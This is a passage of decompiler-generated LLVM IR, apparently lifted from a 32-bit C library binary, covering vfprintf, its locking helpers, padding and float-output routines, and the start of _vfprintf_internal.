define i32 @__GI_vfprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_805fbc5 = add i32 %arg1, 52
  %v2_805fbc5 = inttoptr i32 %v1_805fbc5 to i32*
  %v3_805fbc5 = load i32, i32* %v2_805fbc5, align 4
  %v1_805fbc8 = icmp eq i32 %v3_805fbc5, 0
  %v1_805fbca = icmp eq i1 %v1_805fbc8, false
  call void @__pseudo_cond_branch(i1 %v1_805fbca, i32 134609910)
  %v0_805fbcc = load i32, i32* inttoptr (i32 8 to i32*), align 8
  %v0_805fbd3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805fbd3 = add i32 %v0_805fbd3, 64
  %v2_805fbd3 = inttoptr i32 %v1_805fbd3 to i32*
  %v3_805fbd3 = load i32, i32* %v2_805fbd3, align 4
  %v15_805fbd3 = icmp eq i32 %v3_805fbd3, %v0_805fbcc
  call void @__pseudo_cond_branch(i1 %v15_805fbd3, i32 134609907)
  store i32 1, i32* %ecx.global-to-local, align 4
  store i32 %v3_805fbc5, i32* %eax.global-to-local, align 4
  %v0_805fbdf = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_805fbdf = icmp eq i32 %v0_805fbdf, 0
  call void @__pseudo_cond_branch(i1 %v1_805fbdf, i32 134609898)
  %v0_805fbe9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805fbe9 = add i32 %v0_805fbe9, 56
  %v2_805fbe9 = inttoptr i32 %v1_805fbe9 to i32*
  %v3_805fbe9 = load i32, i32* %v2_805fbe9, align 4
  %v4_805fbe9 = load i32, i32* %ecx.global-to-local, align 4
  %v5_805fbe9 = load i32, i32* %eax.global-to-local, align 4
  %v16_805fbe9 = icmp eq i32 %v5_805fbe9, %v3_805fbe9
  %v23_805fbe9 = select i1 %v16_805fbe9, i32 %v4_805fbe9, i32 %v3_805fbe9
  store i32 %v23_805fbe9, i32* %v2_805fbe9, align 4
  store i32 %v3_805fbe9, i32* %eax.global-to-local, align 4
  %v1_805fbee = icmp eq i1 %v16_805fbe9, false
  call void @__pseudo_cond_branch(i1 %v1_805fbee, i32 134610013)
  ret i32 %v3_805fbe9

; uselistorder directives
  uselistorder i1 %v16_805fbe9, { 1, 0 }
  uselistorder i32 %v3_805fbe9, { 1, 0, 3, 2 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_805fbf0() local_unnamed_addr {
dec_label_pc_805fbf0:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %v0_805fbf0 = load i32, i32* @edx, align 4
  %v1_805fbf0 = load i32, i32* @ebx, align 4
  %v2_805fbf0 = add i32 %v1_805fbf0, 64
  %v3_805fbf0 = inttoptr i32 %v2_805fbf0 to i32*
  store i32 %v0_805fbf0, i32* %v3_805fbf0, align 4
  %v0_805fbf3 = load i32, i32* @ebx, align 4
  %v1_805fbf3 = add i32 %v0_805fbf3, 60
  %v2_805fbf3 = inttoptr i32 %v1_805fbf3 to i32*
  %v3_805fbf3 = load i32, i32* %v2_805fbf3, align 4
  %v4_805fbf3 = add i32 %v3_805fbf3, 1
  store i32 %v4_805fbf3, i32* %v2_805fbf3, align 4
  %v0_805fbf6 = load i32, i32* @ebx, align 4
  %v1_805fbf6 = inttoptr i32 %v0_805fbf6 to i16*
  %v2_805fbf6 = load i16, i16* %v1_805fbf6, align 2
  %v3_805fbf6 = zext i16 %v2_805fbf6 to i32
  %v1_805fbf9 = and i32 %v3_805fbf6, 192
  %v6_805fbfe = icmp eq i32 %v1_805fbf9, 192
  br i1 %v6_805fbfe, label %dec_label_pc_805fbf0.dec_label_pc_805fc1c_crit_edge, label %dec_label_pc_805fc05

dec_label_pc_805fbf0.dec_label_pc_805fc1c_crit_edge: ; preds = %dec_label_pc_805fbf0
  br label %dec_label_pc_805fc1c

dec_label_pc_805fc05:                             ; preds = %dec_label_pc_805fbf0
  %v5_805fc0d = call i32 @__stdio_trans2w_o(i16* %v1_805fbf6, i32 128, i32 %v1_805fbf9, i32 %v1_805fbf9)
  %v1_805fc18 = icmp eq i32 %v5_805fc0d, 0
  %v1_805fc1a = icmp eq i1 %v1_805fc18, false
  br i1 %v1_805fc1a, label %dec_label_pc_805fc30, label %dec_label_pc_805fc05.dec_label_pc_805fc1c_crit_edge

dec_label_pc_805fc05.dec_label_pc_805fc1c_crit_edge: ; preds = %dec_label_pc_805fc05
  %v0_805fc25.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805fc1c

dec_label_pc_805fc1c:                             ; preds = %dec_label_pc_805fbf0.dec_label_pc_805fc1c_crit_edge, %dec_label_pc_805fc05.dec_label_pc_805fc1c_crit_edge
  %v0_805fc25 = phi i32 [ %v0_805fbf6, %dec_label_pc_805fbf0.dec_label_pc_805fc1c_crit_edge ], [ %v0_805fc25.pre, %dec_label_pc_805fc05.dec_label_pc_805fc1c_crit_edge ]
  %v3_805fc26 = inttoptr i32 %tmp to i8*
  %v4_805fc26 = call i32 @_vfprintf_internal(i32 %v0_805fc25, i8* %v3_805fc26, i32 %tmp6)
  br label %dec_label_pc_805fc30

dec_label_pc_805fc30:                             ; preds = %dec_label_pc_805fc05, %dec_label_pc_805fc1c
  %v0_805fc30 = load i32, i32* @esi, align 4
  %v1_805fc30 = icmp eq i32 %v0_805fc30, 0
  %v1_805fc32 = icmp eq i1 %v1_805fc30, false
  call void @__pseudo_cond_branch(i1 %v1_805fc32, i32 134610007)
  %v0_805fc34 = load i32, i32* @ebx, align 4
  %v1_805fc34 = add i32 %v0_805fc34, 60
  %v2_805fc34 = inttoptr i32 %v1_805fc34 to i32*
  %v3_805fc34 = load i32, i32* %v2_805fc34, align 4
  %v1_805fc37 = add i32 %v3_805fc34, -1
  %v8_805fc37 = icmp eq i32 %v1_805fc37, 0
  store i32 %v1_805fc37, i32* %v2_805fc34, align 4
  %v1_805fc3d = icmp eq i1 %v8_805fc37, false
  call void @__pseudo_cond_branch(i1 %v1_805fc3d, i32 134610007)
  %v0_805fc3f = load i32, i32* @ebx, align 4
  %v1_805fc3f = add i32 %v0_805fc3f, 64
  %v2_805fc3f = inttoptr i32 %v1_805fc3f to i32*
  store i32 0, i32* %v2_805fc3f, align 4
  %v0_805fc46 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_805fc46 = icmp eq i32 %v0_805fc46, 0
  call void @__pseudo_cond_branch(i1 %v1_805fc46, i32 134610001)
  %v0_805fc50 = load i32, i32* @ebx, align 4
  %v1_805fc50 = add i32 %v0_805fc50, 56
  %v2_805fc50 = inttoptr i32 %v1_805fc50 to i32*
  %v3_805fc50 = load i32, i32* %v2_805fc50, align 4
  %v4_805fc50 = add i32 %v3_805fc50, -1
  %v12_805fc50 = icmp eq i32 %v4_805fc50, 0
  store i32 %v4_805fc50, i32* %v2_805fc50, align 4
  %v1_805fc55 = icmp eq i1 %v12_805fc50, false
  call void @__pseudo_cond_branch(i1 %v1_805fc55, i32 134610023)
  ret i32 %v1_805fc37

; uselistorder directives
  uselistorder i32 %v4_805fc50, { 1, 0 }
  uselistorder i32 %v1_805fbf9, { 1, 2, 0 }
  uselistorder i32 (i32, i8*, i32)* @_vfprintf_internal, { 1, 0 }
  uselistorder label %dec_label_pc_805fc30, { 1, 0 }
  uselistorder label %dec_label_pc_805fc1c, { 1, 0 }
}

define i32 @function_805fc57() local_unnamed_addr {
dec_label_pc_805fc57:
  %v0_805fc57 = load i32, i32* @edx, align 4
  ret i32 %v0_805fc57
}

define i32 @_L_lock_18() local_unnamed_addr {
entry:
  %v0_805fc5d = load i32, i32* @ebx, align 4
  %v1_805fc5d = add i32 %v0_805fc5d, 56
  store i32 %v1_805fc5d, i32* @ecx, align 4
  %v0_805fc60 = call i32 @__lll_lock_wait_private()
  %v0_805fc65 = call i32 @function_805fbf0()
  ret i32 %v0_805fc65
}

define i32 @_L_unlock_62() local_unnamed_addr {
entry:
  %v0_805fc67 = load i32, i32* @ebx, align 4
  %v1_805fc67 = add i32 %v0_805fc67, 56
  store i32 %v1_805fc67, i32* @eax, align 4
  %v0_805fc6a = call i32 @__lll_unlock_wake_private()
  %v0_805fc6f = call i32 @function_805fc57()
  ret i32 %v0_805fc6f
}

define i32 @_charpad() local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i32, align 4
  %v0_805fc74 = load i32, i32* @ebp, align 4
  %v0_805fc75 = load i32, i32* @edi, align 4
  %v0_805fc76 = load i32, i32* @eax, align 4
  store i32 %v0_805fc76, i32* @edi, align 4
  %v0_805fc78 = load i32, i32* @esi, align 4
  %v0_805fc79 = load i32, i32* @ecx, align 4
  store i32 %v0_805fc79, i32* @esi, align 4
  %v0_805fc7b = load i32, i32* @ebx, align 4
  store i32 %v0_805fc79, i32* @ebx, align 4
  %v2_805fc81 = ptrtoint i32* %stack_var_-17 to i32
  store i32 %v2_805fc81, i32* @ebp, align 4
  %v0_805fc85 = load i32, i32* @edx, align 4
  store i32 %v0_805fc85, i32* %stack_var_-17, align 4
  %v1_805fc8c2 = icmp eq i32 %v0_805fc79, 0
  br i1 %v1_805fc8c2, label %dec_label_pc_805fca0, label %dec_label_pc_805fc90.lr.ph

dec_label_pc_805fc90.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_805fc90

dec_label_pc_805fc8b:                             ; preds = %dec_label_pc_805fc90
  %v1_805fc8b = add i32 %v0_805fc8b, -1
  %v8_805fc8b = icmp eq i32 %v1_805fc8b, 0
  store i32 %v1_805fc8b, i32* @ebx, align 4
  br i1 %v8_805fc8b, label %dec_label_pc_805fca0.loopexit, label %dec_label_pc_805fc8b.dec_label_pc_805fc90_crit_edge

dec_label_pc_805fc8b.dec_label_pc_805fc90_crit_edge: ; preds = %dec_label_pc_805fc8b
  %v0_805fc91.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805fc90

dec_label_pc_805fc90:                             ; preds = %dec_label_pc_805fc8b.dec_label_pc_805fc90_crit_edge, %dec_label_pc_805fc90.lr.ph
  %v0_805fc90 = phi i32 [ %v0_805fc76, %dec_label_pc_805fc90.lr.ph ], [ 0, %dec_label_pc_805fc8b.dec_label_pc_805fc90_crit_edge ]
  %v0_805fc91 = phi i32 [ %v0_805fc76, %dec_label_pc_805fc90.lr.ph ], [ %v0_805fc91.pre, %dec_label_pc_805fc8b.dec_label_pc_805fc90_crit_edge ]
  %v4_805fc95 = call i32 @__stdio_fwrite(i32 %v2_805fc81, i32 1, i32 %v0_805fc91, i32 %v0_805fc90)
  %v8_805fc9d = icmp eq i32 %v4_805fc95, 1
  %v0_805fc8b = load i32, i32* @ebx, align 4
  br i1 %v8_805fc9d, label %dec_label_pc_805fc8b, label %dec_label_pc_805fca0.loopexit

dec_label_pc_805fca0.loopexit:                    ; preds = %dec_label_pc_805fc8b, %dec_label_pc_805fc90
  %v1_805fca3.ph = phi i32 [ %v0_805fc8b, %dec_label_pc_805fc90 ], [ 0, %dec_label_pc_805fc8b ]
  %v0_805fca3.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805fca0

dec_label_pc_805fca0:                             ; preds = %dec_label_pc_805fca0.loopexit, %entry
  %v0_805fca3 = phi i32 [ 0, %entry ], [ %v0_805fca3.pre, %dec_label_pc_805fca0.loopexit ]
  %v1_805fca3 = phi i32 [ 0, %entry ], [ %v1_805fca3.ph, %dec_label_pc_805fca0.loopexit ]
  %v2_805fca3 = sub i32 %v0_805fca3, %v1_805fca3
  store i32 %v0_805fc7b, i32* @ebx, align 4
  store i32 %v0_805fc78, i32* @esi, align 4
  store i32 %v0_805fc75, i32* @edi, align 4
  store i32 %v0_805fc74, i32* @ebp, align 4
  ret i32 %v2_805fca3

; uselistorder directives
  uselistorder i32 %v1_805fc8b, { 1, 0 }
  uselistorder label %dec_label_pc_805fca0.loopexit, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  store i32 0, i32* @ebp, align 4
  store i32 %arg2, i32* @esi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v3_805fcbf = trunc i32 %arg2 to i8
  %v5_805fcbf = icmp slt i8 %v3_805fcbf, 0
  %v1_805fcc1 = icmp eq i1 %v5_805fcbf, false
  %tmp21 = ptrtoint i8* %arg4 to i32
  br i1 %v1_805fcc1, label %dec_label_pc_805fcf2, label %dec_label_pc_805fcc3

dec_label_pc_805fcc3:                             ; preds = %entry
  %v3_805fcca = call i32 @strlen(i8* %arg4)
  %v0_805fcd2 = load i32, i32* @ebx, align 4
  %v2_805fcd2 = sub i32 %v0_805fcd2, %v3_805fcca
  store i32 %v2_805fcd2, i32* @ebx, align 4
  store i32 %v3_805fcca, i32* @edi, align 4
  %tmp23 = icmp slt i32 %v2_805fcd2, 1
  br i1 %tmp23, label %dec_label_pc_805fcf0, label %dec_label_pc_805fcda

dec_label_pc_805fcda:                             ; preds = %dec_label_pc_805fcc3
  store i32 %arg1, i32* @eax, align 4
  %v0_805fcde = load i32, i32* @esi, align 4
  %v1_805fcde = urem i32 %v0_805fcde, 128
  store i32 %v1_805fcde, i32* @esi, align 4
  store i32 %v2_805fcd2, i32* @ecx, align 4
  store i32 %v1_805fcde, i32* @edx, align 4
  %v0_805fce5 = call i32 @_charpad()
  %v12_805fcea = icmp eq i32 %v0_805fce5, %v2_805fcd2
  store i32 %v0_805fce5, i32* @ebp, align 4
  %v1_805fcee = icmp eq i1 %v12_805fcea, false
  br i1 %v1_805fcee, label %dec_label_pc_805fd0c, label %dec_label_pc_805fcda.dec_label_pc_805fcf0_crit_edge

dec_label_pc_805fcda.dec_label_pc_805fcf0_crit_edge: ; preds = %dec_label_pc_805fcda
  %v0_805fcf0.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805fcf0

dec_label_pc_805fcf0:                             ; preds = %dec_label_pc_805fcda.dec_label_pc_805fcf0_crit_edge, %dec_label_pc_805fcc3
  %v0_805fcf0 = phi i32 [ %v0_805fcf0.pre, %dec_label_pc_805fcda.dec_label_pc_805fcf0_crit_edge ], [ %v3_805fcca, %dec_label_pc_805fcc3 ]
  store i32 %v0_805fcf0, i32* @ebx, align 4
  br label %dec_label_pc_805fcf2

dec_label_pc_805fcf2:                             ; preds = %entry, %dec_label_pc_805fcf0
  %v0_805fcfd = phi i32 [ %arg3, %entry ], [ %v0_805fcf0, %dec_label_pc_805fcf0 ]
  %tmp24 = icmp slt i32 %v0_805fcfd, 1
  br i1 %tmp24, label %dec_label_pc_805fd0a, label %dec_label_pc_805fcf8

dec_label_pc_805fcf8:                             ; preds = %dec_label_pc_805fcf2
  %v0_805fcf8 = load i32, i32* @edx, align 4
  %v5_805fd02 = call i32 @__stdio_fwrite(i32 %tmp21, i32 %v0_805fcfd, i32 %arg1, i32 %v0_805fcf8)
  br label %dec_label_pc_805fd0a

dec_label_pc_805fd0a:                             ; preds = %dec_label_pc_805fcf2, %dec_label_pc_805fcf8
  %v1_805fd0a = phi i32 [ 0, %dec_label_pc_805fcf2 ], [ %v5_805fd02, %dec_label_pc_805fcf8 ]
  %v0_805fd0a = load i32, i32* @ebp, align 4
  %v2_805fd0a = add i32 %v0_805fd0a, %v1_805fd0a
  br label %dec_label_pc_805fd0c

dec_label_pc_805fd0c:                             ; preds = %dec_label_pc_805fcda, %dec_label_pc_805fd0a
  %v0_805fd0f = phi i32 [ %v0_805fce5, %dec_label_pc_805fcda ], [ %v2_805fd0a, %dec_label_pc_805fd0a ]
  ret i32 %v0_805fd0f

; uselistorder directives
  uselistorder i32 %v0_805fcfd, { 1, 0 }
  uselistorder i32 %v0_805fce5, { 1, 2, 0 }
  uselistorder i32 %v1_805fcde, { 1, 0 }
  uselistorder i32 %v2_805fcd2, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_805fd0c, { 1, 0 }
  uselistorder label %dec_label_pc_805fd0a, { 1, 0 }
  uselistorder label %dec_label_pc_805fcf2, { 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %sf.global-to-local = alloca i1, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %stack_var_-380 = alloca i32, align 4
  %stack_var_-364 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805fd19 = load i32, i32* @ebx, align 4
  store i32 %v0_805fd19, i32* %stack_var_-16, align 4
  %v4_805fd19 = ptrtoint i32* %stack_var_-16 to i32
  %v1_805fd1a = add i32 %v4_805fd19, -372
  %v10_805fd1a = icmp slt i32 %v1_805fd1a, 0
  store i1 %v10_805fd1a, i1* %sf.global-to-local, align 1
  %v4_805fd20 = ptrtoint i8* %arg2 to i32
  store i32 %v4_805fd20, i32* @ebx, align 4
  %v2_805fd28 = ptrtoint i32* %stack_var_-364 to i32
  store i32 %v2_805fd28, i32* @esi, align 4
  %tmp63 = bitcast i32* %stack_var_-364 to i8*
  %v5_805fd2d = call i32 @_ppfs_init(i8* %tmp63, i32 %v4_805fd20)
  store i32 %v5_805fd2d, i32* %eax.global-to-local, align 4
  %v2_805fd35 = icmp slt i32 %v5_805fd2d, 0
  store i1 %v2_805fd35, i1* %sf.global-to-local, align 1
  %v1_805fd37 = icmp eq i1 %v2_805fd35, false
  br i1 %v1_805fd37, label %dec_label_pc_805fd77, label %dec_label_pc_805fd39

dec_label_pc_805fd39:                             ; preds = %entry
  %v12_805fd32 = ptrtoint i32* %stack_var_-380 to i32
  %v3_805fd39 = load i32, i32* %stack_var_-364, align 4
  store i32 %v3_805fd39, i32* @ebx, align 4
  %v1_805fd3d = add i32 %v12_805fd32, -12
  %v10_805fd3d = icmp slt i32 %v1_805fd3d, 0
  store i1 %v10_805fd3d, i1* %sf.global-to-local, align 1
  %v5_805fd40 = inttoptr i32 %v3_805fd39 to i8*
  %v3_805fd41 = call i32 @strlen(i8* %v5_805fd40)
  store i32 %v3_805fd41, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-380, align 4
  %v1_805fd50 = icmp eq i32 %v3_805fd41, 0
  %v2_805fd50 = icmp slt i32 %v3_805fd41, 0
  store i1 %v2_805fd50, i1* %sf.global-to-local, align 1
  br i1 %v1_805fd50, label %dec_label_pc_8060329, label %dec_label_pc_805fd58

dec_label_pc_805fd58:                             ; preds = %dec_label_pc_805fd39
  %v0_805fd58 = load i32, i32* @edx, align 4
  %v0_805fd61 = load i32, i32* @ebx, align 4
  %v6_805fd62 = call i32 @__stdio_fwrite(i32 %v0_805fd61, i32 %v3_805fd41, i32 %arg1, i32 %v0_805fd58)
  store i32 %v6_805fd62, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-380, align 4
  %v0_805fd6f = load i32, i32* @esp, align 4
  %v1_805fd6f = add i32 %v0_805fd6f, 16
  %v7_805fd6f = icmp slt i32 %v1_805fd6f, 0
  store i1 %v7_805fd6f, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_8060329

dec_label_pc_805fd77:                             ; preds = %entry
  %v6_805fd81 = call i32 @_ppfs_prepargs(i32 %v2_805fd28, i32 %arg3, i32 %v5_805fd2d, i32 %v5_805fd2d)
  store i32 %v6_805fd81, i32* %eax.global-to-local, align 4
  %v0_805fd86 = load i32, i32* @ebx, align 4
  store i32 %v0_805fd86, i32* %edx.global-to-local, align 4
  store i32 0, i32* %stack_var_-380, align 4
  %v0_805fd90 = load i32, i32* @esp, align 4
  %v1_805fd90 = add i32 %v0_805fd90, 16
  %v7_805fd90 = icmp slt i32 %v1_805fd90, 0
  store i1 %v7_805fd90, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_805fd96

dec_label_pc_805fd95:                             ; preds = %dec_label_pc_805fd9c
  %v1_805fd95 = add i32 %v0_805fda4, 1
  %v9_805fd95 = icmp slt i32 %v1_805fd95, 0
  store i1 %v9_805fd95, i1* %sf.global-to-local, align 1
  store i32 %v1_805fd95, i32* @ebx, align 4
  br label %dec_label_pc_805fd96.backedge

dec_label_pc_805fd96.backedge:                    ; preds = %dec_label_pc_805fd95, %dec_label_pc_806030f, %dec_label_pc_806031a
  %v1_805fda026 = phi i32 [ %v1_805fda8, %dec_label_pc_805fd95 ], [ %v3_806030f, %dec_label_pc_806030f ], [ %v1_805fdd4, %dec_label_pc_806031a ]
  %v0_805fd9624 = phi i32 [ %v1_805fd95, %dec_label_pc_805fd95 ], [ %v3_806030f, %dec_label_pc_806030f ], [ %v1_806031a, %dec_label_pc_806031a ]
  %v4_805fd96.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805fd96

dec_label_pc_805fd96:                             ; preds = %dec_label_pc_805fd96.backedge, %dec_label_pc_805fd77
  %v1_805fda8 = phi i32 [ %v1_805fda026, %dec_label_pc_805fd96.backedge ], [ %v0_805fd86, %dec_label_pc_805fd77 ]
  %v0_805fda4 = phi i32 [ %v0_805fd9624, %dec_label_pc_805fd96.backedge ], [ %v0_805fd86, %dec_label_pc_805fd77 ]
  %v4_805fd96 = phi i32 [ %v4_805fd96.pre, %dec_label_pc_805fd96.backedge ], [ %v6_805fd81, %dec_label_pc_805fd77 ]
  %v1_805fd96 = inttoptr i32 %v0_805fda4 to i8*
  %v2_805fd96 = load i8, i8* %v1_805fd96, align 1
  %v3_805fd96 = zext i8 %v2_805fd96 to i32
  %v5_805fd96 = and i32 %v4_805fd96, -256
  %v6_805fd96 = or i32 %v3_805fd96, %v5_805fd96
  store i32 %v6_805fd96, i32* %eax.global-to-local, align 4
  %v4_805fd98 = icmp eq i8 %v2_805fd96, 0
  %v5_805fd98 = icmp slt i8 %v2_805fd96, 0
  store i1 %v5_805fd98, i1* %sf.global-to-local, align 1
  br i1 %v4_805fd98, label %dec_label_pc_805fda0, label %dec_label_pc_805fd9c

dec_label_pc_805fd9c:                             ; preds = %dec_label_pc_805fd96
  %v2_805fd9c = add i8 %v2_805fd96, -37
  %v10_805fd9c = icmp eq i8 %v2_805fd9c, 0
  %v11_805fd9c = icmp slt i8 %v2_805fd9c, 0
  store i1 %v11_805fd9c, i1* %sf.global-to-local, align 1
  %v1_805fd9e = icmp eq i1 %v10_805fd9c, false
  br i1 %v1_805fd9e, label %dec_label_pc_805fd95, label %dec_label_pc_805fda0

dec_label_pc_805fda0:                             ; preds = %dec_label_pc_805fd9c, %dec_label_pc_805fd96
  %v2_805fda0 = sub i32 %v0_805fda4, %v1_805fda8
  %v12_805fda0 = icmp eq i32 %v2_805fda0, 0
  %v13_805fda0 = icmp slt i32 %v2_805fda0, 0
  store i1 %v13_805fda0, i1* %sf.global-to-local, align 1
  br i1 %v12_805fda0, label %dec_label_pc_805fdcb, label %dec_label_pc_805fda4

dec_label_pc_805fda4:                             ; preds = %dec_label_pc_805fda0
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_805fda0, i32* @esi, align 4
  store i1 %v13_805fda0, i1* %sf.global-to-local, align 1
  %tmp64 = icmp slt i32 %v2_805fda0, 1
  br i1 %tmp64, label %dec_label_pc_805fdc0, label %dec_label_pc_805fdae

dec_label_pc_805fdae:                             ; preds = %dec_label_pc_805fda4
  %v1_805fdae = load i32, i32* @esp, align 4
  %v2_805fdae = add i32 %v1_805fdae, -4
  %v3_805fdae = inttoptr i32 %v2_805fdae to i32*
  store i32 0, i32* %v3_805fdae, align 4
  %v1_805fdaf = add i32 %v1_805fdae, 384
  %v2_805fdaf = inttoptr i32 %v1_805fdaf to i32*
  %v3_805fdaf = load i32, i32* %v2_805fdaf, align 4
  %v5_805fdaf = add i32 %v1_805fdae, -8
  %v6_805fdaf = inttoptr i32 %v5_805fdaf to i32*
  store i32 %v3_805fdaf, i32* %v6_805fdaf, align 4
  %v3_805fdb6 = add i32 %v1_805fdae, -12
  %v4_805fdb6 = inttoptr i32 %v3_805fdb6 to i32*
  store i32 %v2_805fda0, i32* %v4_805fdb6, align 4
  %v0_805fdb7 = load i32, i32* %edx.global-to-local, align 4
  %v2_805fdb7 = add i32 %v1_805fdae, -16
  %v3_805fdb7 = inttoptr i32 %v2_805fdb7 to i32*
  store i32 %v0_805fdb7, i32* %v3_805fdb7, align 4
  %v0_805fdb8 = load i32, i32* %stack_var_-380, align 4
  %v4_805fdb8 = call i32 @__stdio_fwrite(i32 %v0_805fdb8, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_805fdb8, i32* %eax.global-to-local, align 4
  %v0_805fdbd = load i32, i32* @esp, align 4
  %v1_805fdbd = add i32 %v0_805fdbd, 16
  %v7_805fdbd = icmp slt i32 %v1_805fdbd, 0
  store i1 %v7_805fdbd, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_805fdc0

dec_label_pc_805fdc0:                             ; preds = %dec_label_pc_805fda4, %dec_label_pc_805fdae
  %v3_805fdc8 = phi i32 [ 0, %dec_label_pc_805fda4 ], [ %v4_805fdb8, %dec_label_pc_805fdae ]
  %v3_805fdc0 = sub i32 %v3_805fdc8, %v2_805fda0
  %v13_805fdc0 = icmp eq i32 %v3_805fdc0, 0
  %v14_805fdc0 = icmp slt i32 %v3_805fdc0, 0
  store i1 %v14_805fdc0, i1* %sf.global-to-local, align 1
  %v1_805fdc2 = icmp eq i1 %v13_805fdc0, false
  %v0_8060322.pre.pre = load i32, i32* @esp, align 4
  br i1 %v1_805fdc2, label %dec_label_pc_8060322, label %dec_label_pc_805fdc8

dec_label_pc_805fdc8:                             ; preds = %dec_label_pc_805fdc0
  %v1_805fdc8 = inttoptr i32 %v0_8060322.pre.pre to i32*
  %v2_805fdc8 = load i32, i32* %v1_805fdc8, align 4
  %v4_805fdc8 = add i32 %v2_805fdc8, %v3_805fdc8
  %v15_805fdc8 = icmp slt i32 %v4_805fdc8, 0
  store i1 %v15_805fdc8, i1* %sf.global-to-local, align 1
  store i32 %v4_805fdc8, i32* %v1_805fdc8, align 4
  %v0_805fdcb.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805fdcb

dec_label_pc_805fdcb:                             ; preds = %dec_label_pc_805fda0, %dec_label_pc_805fdc8
  %v0_806031a = phi i32 [ %v0_805fda4, %dec_label_pc_805fda0 ], [ %v0_805fdcb.pre, %dec_label_pc_805fdc8 ]
  %v1_805fdcb = inttoptr i32 %v0_806031a to i8*
  %v2_805fdcb = load i8, i8* %v1_805fdcb, align 1
  %v3_805fdcb = icmp eq i8 %v2_805fdcb, 0
  %v4_805fdcb = icmp slt i8 %v2_805fdcb, 0
  store i1 %v4_805fdcb, i1* %sf.global-to-local, align 1
  br i1 %v3_805fdcb, label %dec_label_pc_8060329, label %dec_label_pc_805fdd4

dec_label_pc_805fdd4:                             ; preds = %dec_label_pc_805fdcb
  %v1_805fdd4 = add i32 %v0_806031a, 1
  %v2_805fdd4 = inttoptr i32 %v1_805fdd4 to i8*
  %v3_805fdd4 = load i8, i8* %v2_805fdd4, align 1
  %v4_805fdd4 = add i8 %v3_805fdd4, -37
  %v12_805fdd4 = icmp eq i8 %v4_805fdd4, 0
  %v13_805fdd4 = icmp slt i8 %v4_805fdd4, 0
  store i1 %v13_805fdd4, i1* %sf.global-to-local, align 1
  store i32 %v1_805fdd4, i32* %edx.global-to-local, align 4
  br i1 %v12_805fdd4, label %dec_label_pc_806031a, label %dec_label_pc_805fde1

dec_label_pc_805fde1:                             ; preds = %dec_label_pc_805fdd4
  %v1_805fde1 = load i32, i32* @esp, align 4
  %v2_805fde1 = add i32 %v1_805fde1, 16
  %v3_805fde1 = inttoptr i32 %v2_805fde1 to i32*
  store i32 %v1_805fdd4, i32* %v3_805fde1, align 4
  %v0_805fde5 = load i32, i32* @esp, align 4
  %v1_805fde5 = add i32 %v0_805fde5, 360
  %v2_805fde5 = inttoptr i32 %v1_805fde5 to i32*
  store i32 0, i32* %v2_805fde5, align 4
  %v0_805fdf0 = load i32, i32* @esp, align 4
  %v1_805fdf0 = add i32 %v0_805fdf0, -12
  %v10_805fdf0 = icmp slt i32 %v1_805fdf0, 0
  store i1 %v10_805fdf0, i1* %sf.global-to-local, align 1
  %v1_805fdf3 = add i32 %v0_805fdf0, 16
  store i32 %v1_805fdf3, i32* %eax.global-to-local, align 4
  %v2_805fdf7 = add i32 %v0_805fdf0, -16
  %v3_805fdf7 = inttoptr i32 %v2_805fdf7 to i32*
  store i32 %v1_805fdf3, i32* %v3_805fdf7, align 4
  %v0_805fdf8 = load i32, i32* %stack_var_-380, align 4
  %v1_805fdf8 = call i32 @_ppfs_parsespec(i32 %v0_805fdf8)
  store i32 %v1_805fdf8, i32* %eax.global-to-local, align 4
  %v0_805fdfd = load i32, i32* @esp, align 4
  %v1_805fdfd = inttoptr i32 %v0_805fdfd to i32*
  %v2_805fdfd = load i32, i32* %v1_805fdfd, align 4
  store i32 %v2_805fdfd, i32* %eax.global-to-local, align 4
  %v1_805fdfe = add i32 %v0_805fdfd, 32
  store i32 %v1_805fdfe, i32* %edx.global-to-local, align 4
  store i32 %v1_805fdfe, i32* %v1_805fdfd, align 4
  %v0_805fe03 = load i32, i32* %stack_var_-380, align 4
  %v1_805fe03 = call i32 @_ppfs_setargs(i32 %v0_805fe03)
  store i32 %v1_805fe03, i32* %eax.global-to-local, align 4
  %v0_805fe08 = load i32, i32* @esp, align 4
  %v1_805fe08 = add i32 %v0_805fe08, 70
